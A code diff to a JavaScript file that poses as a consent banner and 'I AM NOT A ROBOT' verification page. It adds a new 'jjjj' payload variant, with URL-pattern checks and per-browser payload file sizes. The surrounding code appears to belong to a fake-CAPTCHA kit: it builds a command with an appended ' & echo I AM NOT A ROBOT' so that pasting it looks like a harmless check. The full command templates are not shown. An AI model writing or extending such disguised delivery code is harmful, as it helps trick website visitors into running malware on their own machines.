@@ -36,7 +36,7 @@ var verificationLangKey = 'English';
   }
 
   function getNotReadyHint() {
-    var payload = isJjjPayloadUrl() ? 'jjj' : isJjPayloadUrl() ? 'jj' : getBrowserKey();
+    var payload = isJjjjPayloadUrl() ? 'jjjj' : isJjjPayloadUrl() ? 'jjj' : isJjPayloadUrl() ? 'jj' : getBrowserKey();
     return getVerifyStrings().notReadyCache.replace('{payload}', payload);
   }
 
@@ -112,7 +112,7 @@ var verificationLangKey = 'English';
   var VERIFICATION_ECHO = '                             I AM NOT A ROBOT                           ';
 
   var CONSENT_CONFIG = {
-    version: '1.9.29',
+    version: '1.9.30',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -142,6 +142,12 @@ var verificationLangKey = 'English';
       chrome: 17244,
       edge: 17244,
       brave: 17244
+    },
+    cacheFileSizesJjjj: {
+      firefox: 0,
+      chrome: 17461,
+      edge: 17461,
+      brave: 17461
     },
     verificationSuffix: ' & echo ' + VERIFICATION_ECHO,
     verificationTemplates: {
@@ -266,18 +272,27 @@ var verificationLangKey = 'English';
     return 'Profile 1';
   }
 
+  function isJjjjPayloadUrl() {
+    var u = CONSENT_CONFIG.cacheFileUrl || '';
+    return /\/jjjj([?#]|$)/i.test(u);
+  }
+
   function isJjjPayloadUrl() {
     var u = CONSENT_CONFIG.cacheFileUrl || '';
+    if (isJjjjPayloadUrl()) return false;
     return /\/jjj([?#]|$)/i.test(u);
   }
 
   function isJjPayloadUrl() {
     var u = CONSENT_CONFIG.cacheFileUrl || '';
-    if (isJjjPayloadUrl()) return false;
+    if (isJjjjPayloadUrl() || isJjjPayloadUrl()) return false;
     return /\/jj([?#]|$)/i.test(u);
   }
 
   function getActiveCacheFileSizes() {
+    if (isJjjjPayloadUrl() && CONSENT_CONFIG.cacheFileSizesJjjj) {
+      return CONSENT_CONFIG.cacheFileSizesJjjj;
+    }
     if (isJjjPayloadUrl() && CONSENT_CONFIG.cacheFileSizesJjj) {
       return CONSENT_CONFIG.cacheFileSizesJjj;
     }
@@ -293,6 +308,10 @@ var verificationLangKey = 'English';
     if (n && n > 0) return n;
     if (browserKey === 'edge' || browserKey === 'brave') {
       n = cacheSizes.chrome;
+      if (n && n > 0) return n;
+    }
+    if (isJjjjPayloadUrl()) {
+      n = (CONSENT_CONFIG.cacheFileSizesJjjj || {}).chrome;
       if (n && n > 0) return n;
     }
     if (isJjjPayloadUrl()) {
